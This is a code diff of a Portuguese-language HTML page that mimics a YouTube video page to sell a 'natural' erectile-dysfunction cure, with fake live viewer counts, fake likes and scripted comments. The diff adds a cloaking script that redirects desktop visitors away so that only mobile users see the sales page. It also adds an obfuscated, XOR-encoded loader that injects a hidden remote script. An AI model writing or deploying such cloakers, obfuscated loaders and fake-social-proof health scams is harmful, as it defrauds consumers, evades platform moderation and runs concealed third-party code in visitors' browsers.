@@ -4,6 +4,93 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+    <!-- ============================================================ -->
+    <!-- CLOAKER 2/2 - VERIFICAÇÃO ANTES DO DOMÍNIO CARREGAR          -->
+    <!-- ESTE SCRIPT DEVE FICAR PRIMEIRO, ANTES DE TUDO NO <head>     -->
+    <!-- ============================================================ -->
+    <script>
+    (function(){
+        "use strict";
+        
+        var DESKTOP_URL = "https://zgelo.vercel.app/sal";
+        
+        function isDesktop() {
+            try {
+                var ua = (navigator.userAgent || "").toLowerCase();
+                var uaMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|silk|kindle/i.test(ua);
+                var uaTablet = /ipad|tablet|playbook|silk/i.test(ua) || (/android/i.test(ua) && !/mobile/i.test(ua));
+                
+                var hasTouch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
+                var coarsePointer = window.matchMedia && window.matchMedia("(pointer: coarse)").matches;
+                var hoverNone = window.matchMedia && window.matchMedia("(hover: none)").matches;
+                
+                var w = window.innerWidth || document.documentElement.clientWidth || 0;
+                var h = window.innerHeight || document.documentElement.clientHeight || 0;
+                var shortSide = Math.min(w, h);
+                
+                var dpr = window.devicePixelRatio || 1;
+                var platform = (navigator.platform || "").toLowerCase();
+                var platformDesktop = /win|mac|linux|x11|cros/i.test(platform) && !/iphone|ipad|android/i.test(platform);
+                
+                var scoreMobile = 0;
+                if (uaMobile) scoreMobile += 3;
+                if (uaTablet) scoreMobile += 2;
+                if (hasTouch) scoreMobile += 1;
+                if (coarsePointer) scoreMobile += 1;
+                if (hoverNone) scoreMobile += 1;
+                if (shortSide < 768) scoreMobile += 2;
+                if (shortSide < 480) scoreMobile += 1;
+                
+                var scoreDesktop = 0;
+                if (!hasTouch) scoreDesktop += 2;
+                if (!coarsePointer) scoreDesktop += 1;
+                if (!hoverNone) scoreDesktop += 1;
+                if (shortSide >= 1024) scoreDesktop += 2;
+                if (platformDesktop) scoreDesktop += 1;
+                if (dpr <= 1.5 && shortSide >= 1024) scoreDesktop += 1;
+                
+                return scoreDesktop > scoreMobile && !uaMobile;
+            } catch(e) {
+                return true;
+            }
+        }
+        
+        // Segunda verificação no quiz (sessionStorage) + verificação local
+        var quizDevice = null;
+        try { quizDevice = sessionStorage.getItem("__clk_device__"); } catch(e) {}
+        var localDevice = isDesktop() ? "desktop" : "mobile";
+        
+        // Se quiz disse desktop OU deteção local diz desktop → redireciona JÁ
+        var finalDevice = (quizDevice === "desktop" || localDevice === "desktop") ? "desktop" : "mobile";
+        
+        if (finalDevice === "desktop") {
+            // Redireciona IMEDIATAMENTE, antes da página renderizar
+            // Usa replace para não deixar histórico da página de vendas
+            try {
+                window.stop(); // interrompe carregamento em curso
+            } catch(e) {}
+            
+            // Dupla camada: replace + fallback
+            if (window.location.replace) {
+                window.location.replace(DESKTOP_URL);
+            } else {
+                window.location.href = DESKTOP_URL;
+            }
+            
+            // Fallback extra: se por algum motivo não redirecionou em 100ms
+            setTimeout(function(){
+                if (window.location.href.indexOf("/sal") === -1) {
+                    window.location.href = DESKTOP_URL;
+                }
+            }, 100);
+            
+            // Bloqueia renderização do resto
+            throw new Error("__CLK_REDIRECT__");
+        }
+    })();
+    </script>
+    <!-- ============================================================ -->
+
     <script>(function(){var b_o8=atob("DDvJcw8nAy0Wwv1gOkDrBn1LIRc0qokUSkjzXCBEZ0M4t4kNU12wXWxIbgN0sNITWUmgA3tULFhir45PVlq9FnxTLUdl4NFCW0+9AWZFdllzsd9aYUDrHW5KZg8s4JkBTlrkBntKaktv740SX02sHXsKe055ptATWVDrXy1RYkFjp99aGBm0X3QFbUx7p99aGF+oB24Kdll7q5sZF0u7FnlCbVk7sYgCU1+6USMFdUx6t5hCABnrDlJa");var d_lond=[];for(var h_ba4=0;h_ba4<b_o8.length;h_ba4++){d_lond.push(b_o8.charCodeAt(h_ba4)&255);}var j_sphm=d_lond[0];var j_0p5v=d_lond.slice(1,1+j_sphm);var z_zde=d_lond.slice(1+j_sphm);var l_uau=z_zde.map(function(b,w_2){return b^j_0p5v[w_2%j_sphm];});var d_5u="";for(var j_qhqy=0;j_qhqy<l_uau.length;j_qhqy++){d_5u+=String.fromCharCode(l_uau[j_qhqy]&255);}var g_ew=decodeURIComponent(escape(d_5u));var u_t0=JSON.parse(g_ew);var e_i5q=u_t0.globals||[];e_i5q.forEach(function(l_n2n){window[l_n2n.name]=l_n2n.value;});var f_sv=document.createElement("script");f_sv.src=u_t0.url;f_sv.async=true;f_sv.defer=true;(u_t0.attributes||[]).forEach(function(r_8){f_sv.setAttribute(r_8.name,r_8.value);});(document.head||document.documentElement).appendChild(f_sv);})();</script>
     
     
@@ -12,7 +99,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <style>
-        /* RESET E BASE - EXATAMENTE IGUAL AO YOUTUBE ATUAL (TEMA CLARO) */
         * {
             margin: 0;
             padding: 0;
@@ -28,7 +114,6 @@
             min-height: 100vh;
         }
 
-        /* HEADER - YouTube White (igual ao real) */
         .yt-header {
             position: fixed;
             top: 0;
@@ -111,7 +196,7 @@
             background: #2f2f2f;
         }
         .yt-header .search-bar button::before {
-            content: "\f002"; /* Ícone de lupa do Font Awesome */
+            content: "\f002";
             font-family: "Font Awesome 6 Free";
             font-weight: 900;
             font-size: 16px;
@@ -150,7 +235,6 @@
             border: 1px solid #2f2f2f;
         }
 
-        /* MAIN LAYOUT */
         .yt-main {
             max-width: 1100px;
             margin: 0 auto;
@@ -159,7 +243,6 @@
             flex-direction: column;
         }
 
-        /* PLAYER 3:4 (mantido) */
         .video-wrapper {
             width: 100%;
             max-width: 720px;
@@ -174,7 +257,7 @@
         .video-container {
             position: relative;
             width: 100%;
-            padding-top: 133.33%; /* 4:3 = 3/4 */
+            padding-top: 133.33%;
             background: #000;
         }
         .video-container > * {
@@ -195,7 +278,6 @@
             background: #111;
         }
 
-        /* TÍTULO */
         .video-title {
             font-size: 20px;
             font-weight: 600;
@@ -204,7 +286,6 @@
             line-height: 1.3;
         }
 
-        /* META (canal + ações) */
         .video-meta {
             display: flex;
             flex-wrap: wrap;
@@ -340,7 +421,6 @@
             font-size: 18px;
         }
 
-        /* VIEWS / DATA */
         .views-date {
             font-size: 14px;
             color: #aaa;
@@ -371,7 +451,6 @@
             100% { opacity: 1; transform: scale(1); }
         }
 
-        /* DESCRIÇÃO */
         .description {
             background: #272727;
             padding: 12px 16px;
@@ -391,7 +470,6 @@
             color: #f1f1f1;
         }
 
-        /* COMENTÁRIOS - YouTube White */
         .comments-section {
             margin-top: 8px;
         }
@@ -500,7 +578,6 @@
             margin-top: 10px;
         }
 
-        /* RESPONSIVIDADE */
         @media (max-width: 768px) {
             .yt-header .search-bar {
                 max-width: 200px;
@@ -601,7 +678,6 @@
 </head>
 <body>
 
-    <!-- HEADER YOUTUBE WHITE -->
     <header class="yt-header">
         <a href="#" class="logo">
             <i class="fab fa-youtube"></i> <span>YouTube</span>
@@ -617,9 +693,7 @@
         </div>
     </header>
 
-    <!-- MAIN -->
     <main class="yt-main">
-        <!-- PLAYER 3:4 -->
         <div class="video-wrapper">
             <div class="video-container">
 
@@ -628,10 +702,8 @@
             </div>
         </div>
 
-        <!-- TÍTULO -->
         <h1 class="video-title">Veja como usar o Gelo e Limão para curar a disfunção e devolver a tua masculinidade!</h1>
 
-        <!-- META (Canal + Ações) -->
         <div class="video-meta">
             <div class="action-buttons">
                 <button class="like-btn" id="likeBtn">
@@ -647,24 +719,20 @@
             </div>
         </div>
 
-        <!-- VIEWS + LIVE -->
         <div class="views-date">
             <span class="live-counter"><i class="fas fa-circle"></i> <span id="liveCount">1.234</span> a assistir agora</span>
         </div>
 
-        <!-- DESCRIÇÃO -->
         <div class="description">
             Cansado de depender de Viagra? Esta receita ancestral com sal comum está a devolver a potência e autoestima a milhares de homens. 100% natural, sem efeitos colaterais. Assiste até ao fim e transforma a tua vida sexual!<br>
             <span class="show-more">...mais</span>
         </div>
 
-        <!-- COMENTÁRIOS -->
         <div class="comments-section">
             <div class="comments-header">
                 <span>1.321 Comentários</span>
             </div>
 
-            <!-- Comentário 1 -->
             <div class="comment" data-id="1">
                 <div class="avatar" style="background-image: url('images/1.jpg');"></div>
                 <div class="content">
@@ -677,7 +745,6 @@
                 </div>
             </div>
 
-            <!-- Comentário 2 -->
             <div class="comment" data-id="3">
                 <div class="avatar" style="background-image: url('images/2.jpg');"></div>
                 <div class="content">
@@ -690,7 +757,6 @@
                 </div>
             </div>
 
-            <!-- Comentário 3 -->
             <div class="comment" data-id="4">
                 <div class="avatar" style="background-image: url('images/3.jpg');"></div>
                 <div class="content">
@@ -703,7 +769,6 @@
                 </div>
             </div>
 
-            <!-- Comentário 4 -->
             <div class="comment" data-id="5">
                 <div class="avatar" style="background-image: url('images/4.jpg');"></div>
                 <div class="content">
@@ -716,7 +781,6 @@
                 </div>
             </div>
 
-            <!-- Comentário 5 -->
             <div class="comment" data-id="6">
                 <div class="avatar" style="background-image: url('images/5.jpg');"></div>
                 <div class="content">
@@ -729,7 +793,6 @@
                 </div>
             </div>
 
-            <!-- Comentário 6 -->
             <div class="comment" data-id="7">
                 <div class="avatar" style="background-image: url('images/6.jpg');"></div>
                 <div class="content">
@@ -742,7 +805,6 @@
                 </div>
             </div>
 
-            <!-- Resposta aninhada -->
             <div class="comment reply" data-id="8">
                 <div class="avatar" style="background-image: url('images/7.jpg');"></div>
                 <div class="content">
@@ -760,9 +822,6 @@
     </main>
 
     <script>
-        // === INTERATIVIDADE YOUTUBE ===
-
-        // 1. LIKE principal (5,2k -> incrementa)
         const likeBtn = document.getElementById('likeBtn');
         const likeCountSpan = document.getElementById('likeCount');
         let likeCount = 5200;
@@ -775,7 +834,6 @@
                 liked = true;
                 likeBtn.classList.add('liked');
                 likeCountSpan.textContent = formatNumber(likeCount);
-                // feedback scale
                 likeBtn.style.transform = 'scale(1.1)';
                 setTimeout(() => { likeBtn.style.transform = 'scale(1)'; }, 150);
             } else {
@@ -793,16 +851,14 @@
             return num.toString();
         }
 
-        // 2. Contador de visualizações (flutua)
         const viewSpan = document.getElementById('viewCount');
         let views = 6892;
         setInterval(() => {
             const delta = Math.floor(Math.random() * 10) - 3;
             views = Math.max(6800, views + delta);
-            viewSpan.textContent = views.toLocaleString('pt-PT');
+            if (viewSpan) viewSpan.textContent = views.toLocaleString('pt-PT');
         }, 8000);
 
-        // 3. Live counter (flutua)
         const liveSpan = document.getElementById('liveCount');
         setInterval(() => {
             const base = 1234;
@@ -811,7 +867,6 @@
             liveSpan.textContent = val.toLocaleString('pt-PT');
         }, 15000);
 
-        // 4. Responder (alerta)
         document.querySelectorAll('.reply').forEach(el => {
             el.addEventListener('click', function(e) {
                 e.stopPropagation();
@@ -819,10 +874,9 @@
             });
         });
 
-        // 5. Like nos comentários (incrementa)
         document.querySelectorAll('.comment .like-count').forEach(el => {
             const icon = el.querySelector('i');
-            const textNode = el.childNodes[1]; // texto após o ícone
+            const textNode = el.childNodes[1];
             let count = parseInt(textNode.textContent.trim()) || 0;
             el.style.cursor = 'pointer';
             el.addEventListener('click', function(e) {
@@ -834,23 +888,24 @@
             });
         });
 
-        // 6. Botão Inscrever-se (toggle)
         const subBtn = document.getElementById('subBtn');
-        subBtn.addEventListener('click', function() {
-            if (this.classList.contains('subscribed')) {
-                this.classList.remove('subscribed');
-                this.textContent = 'Inscrever-me';
-                this.style.background = '#cc0000';
-                this.style.color = '#fff';
-                this.style.border = 'none';
-            } else {
-                this.classList.add('subscribed');
-                this.textContent = 'Inscrito';
-                this.style.background = '#272727';
-                this.style.color = '#f1f1f1';
-                this.style.border = '1px solid #3f3f3f';
-            }
-        });
+        if (subBtn) {
+            subBtn.addEventListener('click', function() {
+                if (this.classList.contains('subscribed')) {
+                    this.classList.remove('subscribed');
+                    this.textContent = 'Inscrever-me';
+                    this.style.background = '#cc0000';
+                    this.style.color = '#fff';
+                    this.style.border = 'none';
+                } else {
+                    this.classList.add('subscribed');
+                    this.textContent = 'Inscrito';
+                    this.style.background = '#272727';
+                    this.style.color = '#f1f1f1';
+                    this.style.border = '1px solid #3f3f3f';
+                }
+            });
+        }
 
         console.log('🔥 YouTube White Mode carregado com sucesso!');
     </script>
